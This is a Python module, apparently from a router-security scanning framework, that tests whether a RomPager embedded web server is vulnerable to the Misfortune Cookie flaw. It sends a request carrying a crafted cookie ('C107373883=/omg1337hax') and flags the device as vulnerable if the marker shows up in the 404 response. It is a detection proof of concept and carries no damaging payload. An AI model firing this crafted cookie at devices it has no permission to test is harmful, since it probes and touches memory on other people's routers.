#Name:Misfortune Cookie vulnerability scanner
#File:misfortune_cookie.py
#Author:Ján Trenčanský
#License: ADD LATER
#Created: 4.2.2014
#Last modified: 4.2.2014
#Shodan Dork:
#Description: PoC based on 31C3 presentation

import core.Scanner
from interface.messages import print_failed, print_success, print_red, print_green, print_warning, print_error

import httplib2
import socket
import re


class Scanner(core.Scanner.RextScanner):
    def __init__(self):
        core.Scanner.RextScanner.__init__(self)

    def do_run(self, e):
        #httplib2.debuglevel = 1
        user_agent = 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)'
        headers = {'User-Agent': user_agent,
                   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-language': 'sk,cs;q=0.8,en-US;q=0.5,en;q,0.3',
                   'Connection': 'keep-alive',
                   'Accept-Encoding': 'gzip, deflate',
                   'Cache-Control': 'no-cache',
                   'Cookie': 'C107373883=/omg1337hax'}
        target = 'http://' + self.host + ":" + self.port + '/blabla'
        h = httplib2.Http(timeout=60)
        h.follow_all_redirects = True
        try:
            response, content = h.request(target, 'GET', headers=headers)
            if response.status != 404:
                print_failed("Unexpected HTTP status, expecting 404 got: %d" % response.status)
                print_red("Device is not running RomPager")
            else:
                if 'server' in response.keys():
                    server = response.get('server')
                    if re.search('RomPager', server) is not None:
                        print_green("Got RomPager! Server:%s" % server)
                        if re.search('omg1337hax', content.decode()) is not None:
                            print_success("device is vulnerable to misfortune cookie")
                        else:
                            print_failed("test didn't pass.")
                            print_warning("Device MAY still be vulnerable")
                    else:
                        print_failed("RomPager not detected, device is running: %s " % server)
                else:
                    print_failed("Not running RomPager")
        except socket.timeout:  # Is there a better way of handling timeout in httplib2?
            print_error("Timeout!")

Scanner()
